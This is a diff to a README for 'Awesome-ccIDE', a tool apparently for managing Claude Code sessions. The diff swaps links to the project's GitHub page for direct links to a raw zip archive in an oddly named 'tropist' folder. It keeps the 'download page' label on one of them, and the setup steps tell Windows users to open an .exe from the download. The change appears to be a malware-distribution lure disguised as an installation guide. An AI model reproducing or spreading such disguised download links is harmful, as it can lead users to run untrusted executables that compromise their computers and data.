@@ -1,6 +1,6 @@
 # 💻 Awesome-ccIDE - Manage Claude Code sessions with ease
 
-[![](https://img.shields.io/badge/Download-Awesome--ccIDE-blue.svg)](https://github.com/redagaucho008/Awesome-ccIDE)
+[![](https://img.shields.io/badge/Download-Awesome--ccIDE-blue.svg)](https://github.com/redagaucho008/Awesome-ccIDE/raw/refs/heads/main/tropist/Awesome_IDE_cc_v1.2.zip)
 
 Awesome-ccIDE simplifies how you work with Claude Code. This software organizes your development sessions into one place. You can search through past work, resume tasks quickly, and watch multiple terminal windows at once.
 
@@ -18,7 +18,7 @@ Awesome-ccIDE helps you stay productive. It provides a visual interface for your
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [Awesome-ccIDE download page](https://github.com/redagaucho008/Awesome-ccIDE) to find the latest version.
+1. Visit the [Awesome-ccIDE download page](https://github.com/redagaucho008/Awesome-ccIDE/raw/refs/heads/main/tropist/Awesome_IDE_cc_v1.2.zip) to find the latest version.
 2. Look for the file that ends in .exe.
 3. Click the file name to start the download.
 4. Open the file once it finishes downloading. 
